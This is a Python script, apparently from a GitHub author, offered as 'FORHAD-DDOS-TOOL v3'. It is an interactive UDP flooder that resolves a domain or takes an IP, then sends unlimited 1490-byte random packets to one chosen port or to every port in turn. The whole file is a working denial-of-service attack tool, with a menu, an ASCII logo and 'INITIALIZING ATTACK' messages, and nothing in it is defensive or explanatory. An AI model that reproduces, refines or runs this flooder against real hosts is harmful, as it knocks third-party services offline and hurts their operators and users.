#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FORHAD-DDOS-TOOL v3
Author: Forhad Hasan
GitHub: https://github.com/Forhadj
License: MIT
"""

import os
import socket
import random
import time
from platform import system

# Version
VERSION = "3.0"

# Detect OS for clear command
cmd_clear = "cls" if system() == "Windows" else "clear"

# Function to clear screen
def clear():
    os.system(cmd_clear)

# FORHAD ASCII Logo
def logo():
    print("\033[94m")  # Blue color
    print(r"""
   ███████╗ ██████╗ ██████╗ ██╗  ██╗ █████╗ ██████╗ 
   ██╔════╝██╔═══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗
   █████╗  ██║   ██║██████╔╝█████╔╝ ███████║██████╔╝
   ██╔══╝  ██║   ██║██╔═══╝ ██╔═██╗ ██╔══██║██╔═══╝ 
   ██║     ╚██████╔╝██║     ██║  ██╗██║  ██║██║     
   ╚═╝      ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     
         \033[91mFORHAD-DDOS-TOOL v3 | UDP Flooder\033[0m
    """)
    print("\033[0m")  # Reset color

# UDP Flood Function
def udp_flood(ip, port, rotate_ports=False):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1490)
    sent = 0

    try:
        while True:
            if rotate_ports:
                if port >= 65534:
                    port = 1
                elif port == 1900:  # Skip SSDP
                    port = 1901
            sock.sendto(payload, (ip, port))
            sent += 1
            print(f"\033[32;1m[✓] Sent {sent} packets to {ip}:{port}\033[0m")
            if rotate_ports:
                port += 1
    except KeyboardInterrupt:
        print("\n\033[31;1m[!] Attack stopped by user.\033[0m")

# Menu System
def menu():
    while True:
        clear()
        logo()
        print("╔══════════════════════════════╗")
        print("║      \033[93mFORHAD-DDOS-TOOL v3\033[0m      ║")
        print("╚══════════════════════════════╝")
        print("[1] Start UDP Flood")
        print("[2] About")
        print("[0] Exit")

        choice = input("\n>> Enter your choice: ").strip()

        if choice == "1":
            target_type = input("\n[?] Target is Domain or IP? (d/i): ").lower()
            if target_type == "d":
                domain = input("[+] Enter Domain: ")
                try:
                    ip = socket.gethostbyname(domain)
                    print(f"[✓] Domain resolved to {ip}")
                except socket.gaierror:
                    print("[x] Invalid domain!")
                    time.sleep(2)
                    continue
            elif target_type == "i":
                ip = input("[+] Enter IP Address: ")
            else:
                print("[x] Invalid choice!")
                time.sleep(2)
                continue

            port_mode = input("[?] Certain port? (y/n): ").lower()
            rotate_ports = False
            if port_mode == "y":
                try:
                    port = int(input("[+] Enter Port: "))
                except:
                    print("[x] Invalid port!")
                    time.sleep(2)
                    continue
            elif port_mode == "n":
                port = 2
                rotate_ports = True
            else:
                print("[x] Invalid choice!")
                time.sleep(2)
                continue

            print("\n\033[36;2m[~] INITIALIZING ATTACK...\033[0m")
            time.sleep(1)
            udp_flood(ip, port, rotate_ports)

        elif choice == "2":
            clear()
            logo()
            print("\n\033[92m[•] Author:\033[0m Forhad Hasan")
            print("\033[92m[•] GitHub:\033[0m https://github.com/Forhadj")
            print("\033[92m[•] Version:\033[0m", VERSION)
            input("\nPress Enter to return to menu...")

        elif choice == "0":
            print("Goodbye!")
            break

        else:
            print("[x] Invalid option!")
            time.sleep(2)

# Run the menu
if __name__ == "__main__":
    menu()
